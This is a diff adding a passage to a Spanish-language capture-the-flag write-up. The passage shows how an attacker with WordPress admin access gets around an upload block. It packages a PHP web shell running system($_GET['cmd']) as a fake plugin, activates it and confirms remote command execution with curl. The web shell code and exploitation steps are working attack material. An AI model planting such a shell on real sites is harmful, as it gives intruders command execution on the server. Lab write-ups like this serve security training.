@@ -32,6 +32,58 @@ Una vez dentro del WordPress como admin y haciendo uso de la sección de Medios 
 echo "<?php system(\$_GET['cmd']); ?>" > shell.php
 
 ```
+> [!NOTE]
+> shell.php
+> Lo siento, no tienes permisos para subir este tipo de archivo.
+
+Como de primeras no nos deja subir archivos con esta extensión, pasamos al plan de subir la _reverse shell_ como un plugin de WordPress, este apartado solo acepta archivos de extensión **.zip** así que habrá que crear un "pseudo-plugin" ocn la _reverse shell_ dentro  
+
+```php
+<?php
+/*
+Plugin Name: Shell Plugin
+Plugin URI: http://hackaton
+Description: Plugin de prueba para ejecución remota.
+Version: 1.0
+Author: Hacker
+Author URI: http://hackaton
+*/
+
+if(isset($_GET['cmd'])){
+    system($_GET['cmd']);
+}
+?>
+
+```
+después lo pasamo a **.zip**
+
+```shell
+zip -r shell-plugin.zip shell-plugin.php
+
+```
+lo subimos como plugin y lo activamos. Para hacer la prueba de que funciona, simplemente podemos usar la comanda siguiente:
+
+```shell
+curl -s http://reto02.hackaton/wp1/wp-content/plugins/shell-plugin.php?cmd=id | head -n 10
+
+```
+
+lo que nos mostrará el siguiente resultado:
+
+```html
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta name='robots' content='noindex, nofollow' />
+        <style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
+        <title>Página no encontrada &#8211; HACKATÓN &#8211; RETO 02</title>
+
+```
+
 
 ### Flag 3
 
